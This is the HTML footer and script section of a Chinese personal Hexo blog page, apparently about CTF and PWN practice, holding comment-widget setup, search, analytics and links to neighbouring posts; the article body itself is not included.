        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
let metaPlaceholder = {"nick":"DU-玉","mail":"3529735834@qq.com","link":"网址(https://)"} ;
//这里要换行
new Valine({
        el: '#vcomments',
        appId: 'GUjk2F8uhkyaiYmBg5BCIpJD-gzGzoHsz',
        appKey: 'fxAHSVGA5HymqjFMwQnJ75jS',
        notify: 'true' === 'true',
        verify: 'true' === 'true',
        visitor: 'true' === 'true',
        avatar: 'monsterid',
        pageSize: '10',
        lang: 'zh-CN',
        placeholder: '写下你的评论吧.....',
        meta: ["nick", "mail", "link"],
        recordIP: 'true' === 'true',
        enableQQ: 'monsterid',
        requiredFields: ["46606772953bed0812789d6dc955614e"],
        master: ["46606772953bed0812789d6dc955614e"],
        friends: ["", ""],
        tagMeta: ["博主", "小伙伴", "访客"],
        metaPlaceholder: metaPlaceholder,

    });

    document.body.addEventListener('click', function(e) {
        if (e.target.classList.contains('vsubmit')) {
            const email = document.querySelector('input[type=email]');
            const nick = document.querySelector('input[name=nick]');
            const reg = /^[A-Za-z0-9_-\u4e00-\u9fa5]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;
            if (!email.value || !nick.value || !reg.test(email.value)) {
                const str = `<div class="valert txt-center"><div class="vtext">请填写正确的昵称和邮箱！</div></div>`;
                const vmark = document.querySelector('.vmark');
                vmark.innerHTML = str;
                vmark.style.display = 'block';

                e.stopPropagation();

                setTimeout(function() {
                    vmark.style.display = 'none';
                    vmark.innerHTML = '';
                }, 2500);
            }
        }
        }, true);
</script>



    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/du-yu/skynet.html">
                    <div class="card-image">
                        
                        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/skynet.jpg" class="responsive-img" alt="天网杯">
                        
                        <span class="card-title">天网杯</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            天网杯
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-23
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/IOT/" class="post-category">
                                    IOT
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%A4%A9%E7%BD%91%E6%9D%AF/">
                        <span class="chip bg-color">天网杯</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/du-yu/pwn-begain-exerciser-03.html">
                    <div class="card-image">
                        
                        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/pwnbegain.png" class="responsive-img" alt="pwn013-034">
                        
                        <span class="card-title">pwn013-034</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            pwn013-034
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-17
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/PWN%E5%85%A5%E9%97%A8/" class="post-category">
                                    PWN入门
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/PWN%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98/">
                        <span class="chip bg-color">PWN入门刷题</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: DU-玉<br />'
            + '文章作者: DU-玉<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="tencent"
                   type="playlist"
                   id="1776127550"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2023</span>
            
            <span id="year">2023</span>
            <a href="/about" target="_blank">DU-玉</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">55.8k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2023";
                    var startMonth = "7";
                    var startDate = "4";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/POISON-Biao" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:3529735834@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3529735834" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3529735834" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.11/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?aaa6c944b0ed07922901d7fc571a171d";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

<!-- 深色模式自动调节 -->
<!-- 深色模式按钮 -->
<script>
    // 检查localStorage中是否有'dark'这个键，且其值是否为'1'
    if (localStorage.getItem('dark') === '1') {
        // 如果有且其值为'1'，则给body添加'dark'这个类，切换到深色模式
        document.body.classList.add('dark');
    }
    // 检查当前时间是否在晚上22点到早上7点之间
    // else if (new Date().getHours() >= 22 || new Date().getHours() < 7) {
    //     // 如果是，则给body添加'dark'这个类，切换到深色模式
    //     document.body.classList.add('dark');
    // } 
    // 检查用户的系统是否偏好深色模式
    else if (matchMedia('(prefers-color-scheme: dark)').matches) {
        // 如果是，则给body添加'dark'这个类，切换到深色模式
        document.body.classList.add('dark');
    }
</script>
<!-- 深色模式切换按钮，点击时调用switchNightMode()函数 -->
<a onclick="switchNightMode()" id="sma">
    <!-- 深色模式切换按钮的图标 -->
    <i class="fas fa-lightbulb" id="nightMode" aria-hidden="true"></i>
</a>


    <!-- 天气接口控件   -->
    
        <script type="text/javascript">
        WIDGET = {FID: 'zLkJSQpqsh'}
        </script>
    <!-- <script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script> -->

    <script type="text/javascript">
      var windowWidth = $(window).width();
      if (windowWidth > 768) {
          document.write('<script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"><\/script>');
      }
    </script>
    

    
    <script>
        (function (i, s, o, g, r, a, m) {
            i["DaoVoiceObject"] = r;
            i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
            a = s.createElement(o), m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            a.charset = "utf-8";
            m.parentNode.insertBefore(a, m)
        })(window, document, "script", ('https:' == document.location.protocol ? 'https:' : 'http:') +
            "//widget.daovoice.io/widget/6984b559.js", "daovoice")
        daovoice('init', {
            app_id: "4xxxxxxxe"
        });
        daovoice('update');
    </script>
    

	
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='1'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
